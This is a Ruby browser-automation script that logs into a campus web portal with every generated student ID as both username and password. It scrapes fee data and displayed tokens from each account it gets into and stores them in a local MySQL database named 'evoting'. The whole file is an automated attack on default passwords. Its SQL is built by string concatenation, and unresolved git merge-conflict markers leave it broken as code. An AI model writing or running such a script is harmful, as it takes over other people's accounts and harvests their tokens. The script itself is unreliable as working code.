require 'watir' # Crawler
require 'pry' # Ruby REPL
require 'rb-readline' # Ruby IRB
require 'awesome_print' # Console output
require 'watir-scroll'
require 'net/http'
require 'uri'
require 'json'
require 'mysql2' #database

client = Mysql2::Client.new(:host => "localhost", :username => "root", :password =>"", :database =>"evoting" )
@@baseUrl = "http://192.168.0.55/"
@@browser = Watir::Browser.new :chrome

<<<<<<< HEAD
@@NIM = [ "K1A1"]
@@tahun = [ "20" ]
=======
# @@NIM = ['C1A1', 'C1B1', 'C1B3', 'C1D1', 'C1G1', 'C1E1' ]
@@NIM = ['C1C1', 'C1D3', 'C1F1', 'S1A1', 'C1D7', 'S1B1' ]
@@tahun = [ "19" ]
>>>>>>> a17b5d7c286297f2d2a61983a11992108ddd8d19
@@_end = 150

@@ii = 0
begin

    $i = 1
    begin
        @@no = $i.to_s.rjust(3, "0")
    
        nim = "#{@@NIM[@@ii]}" +"#{@@tahun[0]}"+"#{@@no}"
        pass = nim
        puts( nim )
<<<<<<< HEAD
=======
        puts( "tables" )
>>>>>>> a17b5d7c286297f2d2a61983a11992108ddd8d19
    
        @@browser.goto @@baseUrl + "/index.php?exec=login"
        @@browser.text_field(:name => "NIP").set nim
        @@browser.text_field(:name => "password").set pass
        @@browser.input(:type => "submit" ).click 
    
        sleep(1)    
<<<<<<< HEAD
        if  @@browser.tables( :class => "box" ).length > 1
            begin
                text = @@browser.tables( :class => "box" )[1].tbody.trs[1].tds[1].text
                text = text.split(/\n/)
                if @@browser.h2( :style => "color:red;font-size:25px" ).exists?
                    token = @@browser.h2( :style => "color:red;font-size:25px" ).text
                    puts( token )
                    puts( text.inspect )
                    puts( text[5] )
                    ukt = text[5]
                    tokenfix = token[7, token.length-1]
                    puts(tokenfix)
                    query = "INSERT INTO `users` (`id`, `nim`, `pass`, `ukt`, `token` ) VALUES ( NULL, " + "'#{nim}', " + "'#{pass}', " + "'#{ukt}'" + ", " + "'#{tokenfix}'" + ")"
                    puts( query )
                    
                    client.query(query)
                else
                    puts( token )
                    puts( text.inspect )
                    puts( text[5] )
                    ukt = text[5]
                    query = "INSERT INTO `users` (`id`, `nim`, `pass`, `ukt`) VALUES ( NULL, " + "'#{nim}', " + "'#{pass}', " + "'#{ukt}'" + ")"
                    puts( query )
                        
                    client.query(query)
                end    
            rescue
                ap "failed to save data"
            end
=======
        if @@browser.table(:class => "main" ).exists?
            query = "INSERT INTO `users` (`id`, `nim`, `pass` ) VALUES ( NULL, " + "'#{nim}', " + "'#{pass}' "+ ")"
            puts( query )
            
            client.query(query)
            @@browser.link(:href => "ademik.php?logout=1" ).click
            
>>>>>>> a17b5d7c286297f2d2a61983a11992108ddd8d19
        end
        sleep(2)
        $i +=1;
    end until $i > @@_end

    @@ii += 1
end until @@ii > @@NIM.length - 1

sleep(500)
